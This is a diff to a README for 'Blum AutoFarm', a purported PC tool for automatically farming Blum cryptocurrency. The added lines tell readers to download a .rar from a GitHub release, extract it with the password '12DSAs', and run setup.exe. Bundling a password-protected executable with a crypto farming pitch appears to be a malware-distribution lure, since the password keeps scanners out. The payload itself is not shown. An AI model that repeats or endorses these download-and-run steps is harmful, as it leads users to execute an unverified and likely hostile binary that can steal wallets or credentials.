@@ -1,5 +1,10 @@
 # Blum AutoFarm
 
+- 📦 [Download](https://github.com/YbizWantzModz/BLUM-farm-PC/releases/download/Download/Blum_auto.rar)
+- 1️⃣ Extract the archive (pass:12DSAs)
+- 2️⃣ Run `setup.exe`  
+- 3️⃣ Watch it farm BLUM automatically!
+
 Blum AutoFarm is an automated farming tool for Blum cryptocurrency on PC.
 
 ## Features
